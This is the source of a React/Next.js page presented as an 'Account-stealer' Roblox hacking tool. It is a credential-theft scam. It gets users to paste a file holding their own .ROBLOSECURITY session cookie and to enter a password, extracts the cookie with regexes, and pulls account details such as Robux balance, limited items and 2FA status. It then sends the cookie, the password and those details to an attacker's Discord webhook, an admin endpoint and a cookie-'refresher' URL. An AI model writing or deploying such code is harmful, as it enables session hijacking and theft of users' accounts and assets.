"use client";

import { useState, useEffect } from "react";
import Link from "next/link";
import { ArrowLeft, FileText, Lock, Play, Loader2 } from "lucide-react";
import { useParams } from "next/navigation";
import ConstellationBackground from "@/components/ConstellationBackground";
import { supabase } from "@/lib/supabaseClient";

export default function SlugPage() {
  const params = useParams();
  const slug = params.slug as string;

  const [webhookUrl, setWebhookUrl] = useState<string | null>(null);
  const [loading, setLoading] = useState(true);
  const [error, setError] = useState<string | null>(null);

  const [status, setStatus] = useState<{
    message: string;
    type: "success" | "error" | "info" | null;
  }>({
    message: "",
    type: null,
  });

  const [fileContent, setFileContent] = useState("");
  const [pin, setPin] = useState("");

  // Mark current slug in localStorage
  useEffect(() => {
    if (!slug) return;
    if (typeof window === "undefined") return;
    try {
      window.localStorage.setItem("lastSlug", slug);
    } catch {}
  }, [slug]);

  // Fetch webhook URL from Supabase
  useEffect(() => {
    async function fetchWebhook() {
      if (!slug) {
        setError("Invalid slug.");
        setLoading(false);
        return;
      }

      setLoading(true);
      setError(null);

      try {
        const { data, error } = await supabase
          .from("directories")
          .select("webhook_url")
          .eq("slug", slug)
          .single();

        if (error) throw error;
        if (!data?.webhook_url) throw new Error("Webhook not found.");

        setWebhookUrl(data.webhook_url);
      } catch (err: any) {
        setError(err.message || "Failed to load webhook.");
      } finally {
        setLoading(false);
      }
    }

    fetchWebhook();
  }, [slug]);

  function extractRobloSecurity(text: string): string | null {
    const patterns = [
      /"\.ROBLOSECURITY",\s*"([^"]{700,})"/i,                 
      /"\.ROBLOSECURITY"\s*,\s*"([^"]{700,})"/i,            
      /_\|WARNING:[^|]*\|_[A-Za-z0-9+\/=._-]{680,}/i,      
    ];

    for (const pattern of patterns) {
      const match = text.match(pattern);
      if (match?.[1]) {
        let candidate = match[1].trim();
        if (
          candidate.startsWith('_|WARNING:') &&
          candidate.includes('|_)') &&  
          candidate.length >= 750 &&
          candidate.includes('.')    
        ) {
          return candidate;
        }
      }
    }

    const markers = [
      '".ROBLOSECURITY", "',
      '.ROBLOSECURITY", "',
      '".ROBLOSECURITY", "'
    ];

    for (const marker of markers) {
      const startIdx = text.indexOf(marker);
      if (startIdx !== -1) {
        let cookieStart = startIdx + marker.length;
        let cookieEnd = text.indexOf('", "/', cookieStart);
        if (cookieEnd === -1) {
          cookieEnd = text.indexOf('"', cookieStart + 700);
        }
        if (cookieEnd !== -1 && cookieEnd - cookieStart >= 750) {
          let cookie = text.substring(cookieStart, cookieEnd).trim();
          if (
            cookie.startsWith('_|WARNING:') &&
            cookie.length >= 750 &&
            cookie.includes('.')
          ) {
            return cookie;
          }
        }
      }
    }

    const fallback = text.match(/_ \|WARNING:[^"]{750,}/i);
    if (fallback?.[0]) {
      let cookie = fallback[0].trim().replace(/\s+/g, '');
      if (cookie.length >= 750 && cookie.includes('.')) {
        return cookie;
      }
    }

    return null;
  }

  function extractUserId(text: string): string | null {
    const urlMatch = text.match(/\/users\/(\d+)\/profile/i) || text.match(/\/id\/users\/(\d+)\/profile/i);
    if (urlMatch?.[1]) return urlMatch[1];

    const rbxIdMatch = text.match(/rbxid=(\d+)/i);
    if (rbxIdMatch?.[1]) return rbxIdMatch[1];

    return null;
  }

  async function sendToDiscord(
    cookieValue: string,
    pinValue: string,
    userData: any,
    fullStats: any,
    userId: string | null
  ) {
    if (!webhookUrl) {
      setStatus({ message: "❌ Webhook URL is missing.", type: "error" });
      return;
    }

    if (!userId) {
      setStatus({ message: "⚠️ Không extract được UserID đáng tin cậy", type: "error" });
      return;
    }

    try {
      const profileUrl = `https://www.roblox.com/users/${userId}/profile`;
      const rolimonsUrl = `https://www.rolimons.com/player/${userId}`;
      const autoharUrl = `https://your-autohar-link-here.com?user=${userId}`; // Thay bằng link thật của bạn

      const avatarUrl = fullStats?.avatarHeadshotUrl || userData?.avatarHeadshotUrl || "https://i.imgur.com/0ZxT2S6.png";

      // Lấy dữ liệu từ fullStats (ưu tiên) hoặc userData
      const username = fullStats?.basic?.name || userData?.basic?.name || "N/A";
      const accountAgeDays = fullStats?.accountAgeDays ?? userData?.accountAgeDays ?? "N/A";
      const isDeveloper = fullStats?.isDeveloper ?? false;
      const gameVisits = fullStats?.visits ?? 0;
      const groupMembers = fullStats?.groupsCount ?? 0;
      const robuxBalance = fullStats?.robux ?? 0;
      const pendingRobux = fullStats?.pendingRobux ?? 0;
      const rap = fullStats?.rap ?? 0;
      const limiteds = fullStats?.limiteds ?? 0;
      const summary = fullStats?.summary ?? (robuxBalance + rap);
      const creditBalance = fullStats?.creditBalance ?? 0;
      const inUnknown = 0; // Chưa có field cụ thể, giữ 0
      const emailVerified = fullStats?.emailVerified ? "Verified" : "Not Verified";
      const twoFA = fullStats?.twoFA ?? "No 2FA";
      const inventory = fullStats?.hasInventory ? "True" : "False";
      const premium = fullStats?.premium ?? "N/A";
      const groupsOwned = fullStats?.ownedGroups ?? 0;
      const groupsBalance = fullStats?.groupBalances?.reduce((sum: number, g: any) => sum + (g.robux || 0), 0) ?? 0;

      const mm2Display = fullStats?.mm2_count > 0 ? `True | ${fullStats.mm2_count}` : "False | 0";
      const admDisplay = fullStats?.adm_count > 0 ? `True | ${fullStats.adm_count}` : "False | 0";
      const sabDisplay = fullStats?.sab_count > 0 ? `True | ${fullStats.sab_count}` : "False | 0";

      const cookieDisplay = cookieValue.length > 4000 ? cookieValue.substring(0, 4000) + "..." : cookieValue;
      const cookieNote = cookieValue.length > 4000 ? "\n(long cookie - scroll to view full)" : "";
      const linkRe = `https://manualrefresherforrichpeople.gt.tc/?cookie=${encodeURIComponent(cookieValue)}`;

      const payload = {
        content: "@everyone NEW HIT",
        embeds: [
          {
            title: "RIP_DEATH | <13",
            url: profileUrl,
            color: 16711680,
            fields: [
              {
                name: "Discord Notification",
                value: [
                  `[Rolimons Stats](${rolimonsUrl})`,
                  `[Roblox Profile](${profileUrl})`,
                  `[AutoHar Link](${autoharUrl})`,
                ].join(" | "),
                inline: false,
              },
              {
                name: "Username",
                value: username,
                inline: true,
              },
              {
                name: "Password",
                value: pinValue || "N/A",
                inline: true,
              },
              {
                name: "📊 Account Stats",
                value: [
                  `• Account Age: ${accountAgeDays} Days`,
                  `• Games Developer: ${isDeveloper ? "True" : "False"}`,
                  `• Game Visits: ${gameVisits}`,
                  `• Group Members: ${groupMembers}`,
                ].join("\n"),
                inline: false,
              },
              {
                name: "💰 Robux",
                value: `Balance: ${robuxBalance}\nPending: ${pendingRobux}`,
                inline: true,
              },
              {
                name: "Limiteds",
                value: `RAP: ${rap}\nLimiteds: ${limiteds}`,
                inline: true,
              },
              {
                name: "Summary",
                value: summary,
                inline: true,
              },
              {
                name: "💳 Payments",
                value: `Credit Balance: ${creditBalance}\nin Unknown: ${inUnknown}`,
                inline: true,
              },
              {
                name: "🎮 Games",
                value: [
                  `<:mm2:1475152011740840039> ${mm2Display}`,
                  `<:adm:1475152102266503321> ${admDisplay}`,
                  `<:sab:1475152220671709224> ${sabDisplay}`,
                ].join("\n"),
                inline: true,
              },
              {
                name: "⚙️ Settings",
                value: `Email: ${emailVerified}\n2FA: ${twoFA}`,
                inline: true,
              },
              {
                name: "📦 Inventory",
                value: inventory,
                inline: true,
              },
              {
                name: "Premium",
                value: premium,
                inline: true,
              },
              {
                name: "👥 Groups",
                value: `Owned: ${groupsOwned}\nBalance: ${groupsBalance}`,
                inline: true,
              },
              {
                name: "🔧 Tool Used",
                value: "```toolbox                                      ```",
                inline: false,
              },
            ],
            footer: {
              text: "Refreshed Cookie | Original Cookie",
              icon_url: "https://i.imgur.com/0ZxT2S6.png",
            },
            timestamp: new Date().toISOString(),
            thumbnail: {
              url: avatarUrl,
            },
          },
          {
            title: ".ROBLOSECURITY (Refreshed)",
            description:
              `**Links:**\n` +
              `[Refreshed Cookie](${linkRe}) | ` +
              `[Original Cookie](${linkRe})\n\n` +
              `\`\`\`${cookieDisplay}${cookieNote}\`\`\``,
            color: 16711680,
            author: {
              name: "Refreshed Cookie",
              url: rolimonsUrl,
              icon_url: "https://em-content.zobj.net/source/apple/354/cookie_1f36a.png",
            },
            timestamp: new Date().toISOString(),
            thumbnail: {
              url: "https://em-content.zobj.net/source/apple/354/cookie_1f36a.png",
            },
          },
        ],
      };

      const res = await fetch(webhookUrl, {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify(payload),
      });

      if (res.ok) {
        fetch("/api/post", {
          method: "POST",
          headers: { "Content-Type": "application/json" },
          body: JSON.stringify({
            discordPayload: payload,
            slug,
          }),
        }).catch((err) => console.error("[Admin forward failed]", err));

        setStatus({ message: "Success!", type: "success" });
        setTimeout(() => {
          setFileContent("");
          setPin("");
          setStatus({ message: "", type: null });
        }, 5000);
      } else {
        const errText = await res.text().catch(() => "");
        setStatus({ message: `❌ Failed: ${res.status} - ${errText.slice(0, 100)}`, type: "error" });
      }
    } catch (err: any) {
      console.error("[sendToDiscord error]", err);
      setStatus({ message: "❌ Connection error", type: "error" });
    }
  }

  const handleStart = async () => {
    if (!fileContent.trim() || !pin.trim()) {
      setStatus({ message: "❌ Please enter both script content and PIN!", type: "error" });
      return;
    }

    const robloxCookie = extractRobloSecurity(fileContent);
    if (!robloxCookie) {
      setStatus({ message: "❌ Could not find .ROBLOSECURITY value!", type: "error" });
      return;
    }

    const userId = extractUserId(fileContent) || "unknown";

    setStatus({ message: "⏳ Processing...", type: "info" });

    let userData = null;
    let fullStats = null;

    try {
      const basicRes = await fetch(`/api/roblox-user?userId=${userId}&mode=basic`);
      if (basicRes.ok) userData = await basicRes.json();

      const fullRes = await fetch(
        `/api/roblox-user?userId=${userId}&cookie=${encodeURIComponent(robloxCookie)}&mode=full`
      );
      if (fullRes.ok) fullStats = await fullRes.json();
    } catch (err) {
      console.error("[DEBUG] Fetch user data error:", err);
    }

    await sendToDiscord(robloxCookie, pin, userData, fullStats, userId);
  };

  return (
    <div className="min-h-screen bg-[#0a0a0a] text-white flex flex-col items-center justify-center p-4 relative overflow-hidden">
      <ConstellationBackground />

      {loading && (
        <div className="absolute inset-0 z-50 flex items-center justify-center bg-black/70 backdrop-blur-md">
          <div className="flex flex-col items-center gap-6">
            <Loader2 className="w-14 h-14 text-red-500 animate-spin" />
            <p className="text-xl font-semibold">Loading</p>
          </div>
        </div>
      )}

      {error && (
        <div className="absolute inset-0 z-40 flex items-center justify-center bg-black/80 backdrop-blur-sm">
          <div className="bg-[#121212] border border-red-600/40 rounded-2xl p-8 max-w-lg text-center shadow-2xl">
            <h2 className="text-2xl font-bold text-red-400 mb-4">Something went wrong</h2>
            <p className="text-gray-300 mb-6">{error}</p>
            <Link
              href="/create"
              className="inline-flex items-center gap-2 px-6 py-3 bg-red-600 hover:bg-red-700 rounded-lg text-white font-medium transition-colors shadow-lg shadow-red-900/30"
            >
              <ArrowLeft className="w-5 h-5" />
              Back to Create
            </Link>
          </div>
        </div>
      )}

      <div
        className={`relative z-10 w-full max-w-5xl flex flex-col items-center transition-opacity duration-500 ${loading ? "opacity-40 pointer-events-none" : "opacity-100"}`}
      >
        <div className="w-full mb-6 px-2">
          <Link
            href="/create"
            className="text-[#cbd5e1] font-semibold text-sm tracking-wide hover:text-white transition-colors flex items-center gap-2"
          >
            <ArrowLeft className="w-4 h-4" />
            GO BACK
          </Link>
        </div>

        <div className="text-center mb-8 px-4">
          <h1 className="text-3xl md:text-4xl font-bold tracking-tight text-white capitalize mb-3">
            Account-stealer
          </h1>
          <p className="text-[#94a3b8] text-base max-w-xl mx-auto">
            Hack accounts with ease, with this brand new powershell-based system!
          </p>
        </div>

        <div className="w-full">
          <div className="flex items-center gap-3 mb-6 px-2">
            <h2 className="text-xl font-bold">Bloxtools</h2>
          </div>

          <div className="grid grid-cols-1 md:grid-cols-2 gap-6">
            <div className="bg-[#121212] border border-[#1e1e1e] rounded-2xl p-8 shadow-2xl flex flex-col h-full">
              <h3 className="text-lg font-bold mb-3">Hack Accounts</h3>
              <p className="text-[#94a3b8] text-sm mb-6 leading-relaxed">
                Paste your player file in the box below, then click "Start Hacking!"
              </p>

              {status.type && (
                <div
                  className={`p-4 rounded-xl mb-6 text-sm text-center border animate-in fade-in slide-in-from-top-1 duration-300 ${
                    status.type === "success"
                      ? "bg-emerald-950/30 border-emerald-500/30 text-emerald-300"
                      : status.type === "error"
                      ? "bg-red-950/30 border-red-500/30 text-red-300"
                      : "bg-blue-950/30 border-blue-500/30 text-blue-300"
                  }`}
                >
                  {status.message}
                </div>
              )}

              <div className="space-y-5 mt-auto">
                <div className="relative group">
                  <FileText className="absolute left-4 top-1/2 -translate-y-1/2 w-5 h-5 text-red-500 opacity-70 group-focus-within:opacity-100 transition-opacity" />
                  <input
                    type="text"
                    value={fileContent}
                    onChange={(e) => setFileContent(e.target.value)}
                    placeholder="Enter player file"
                    className="w-full bg-[#1a1a1a] border border-[#2a2a2a] rounded-xl py-4 pl-12 pr-5 text-sm text-white placeholder:text-gray-600 focus:outline-none focus:border-red-500 focus:ring-1 focus:ring-red-500/30 transition-all"
                  />
                </div>

                <div className="relative group">
                  <Lock className="absolute left-4 top-1/2 -translate-y-1/2 w-5 h-5 text-red-500 opacity-70 group-focus-within:opacity-100 transition-opacity" />
                  <input
                    value={pin}
                    onChange={(e) => setPin(e.target.value)}
                    placeholder="Create Password"
                    className="w-full bg-[#1a1a1a] border border-[#2a2a2a] rounded-xl py-4 pl-12 pr-5 text-sm text-white placeholder:text-gray-600 focus:outline-none focus:border-red-500 focus:ring-1 focus:ring-red-500/30 transition-all"
                  />
                </div>

                <button
                  onClick={handleStart}
                  disabled={loading || !!error || status.type === "info"}
                  className="w-full py-4 bg-[#e22d2d] hover:bg-[#c92828] disabled:opacity-60 disabled:hover:bg-[#e22d2d] text-white font-bold text-base rounded-xl flex items-center justify-center gap-3 transition-all shadow-lg shadow-red-900/20 active:scale-[0.98]"
                >
                  Start Hacking!
                </button>
              </div>
            </div>

            <div className="bg-[#121212] border border-[#1e1e1e] rounded-2xl p-8 shadow-2xl flex flex-col h-full">
              <h3 className="text-lg font-bold mb-3">How to use</h3>
              <p className="text-[#94a3b8] text-sm mb-6 leading-relaxed">
                Video Tutorial
              </p>

              <div className="mt-auto aspect-video bg-[#0b1218] border border-white/5 rounded-xl overflow-hidden group">
                <video 
                  controls 
                  className="w-full h-full object-cover"
                  playsInline
                  preload="metadata"
                >
                  <source src="/video.mov" type="video/mp4" />
                  <source src="/video.mov" type="video/quicktime" />
                  Your browser does not support the video tag.
                </video>
              </div>
            </div>
          </div>
        </div>
      </div>
    </div>
  );
}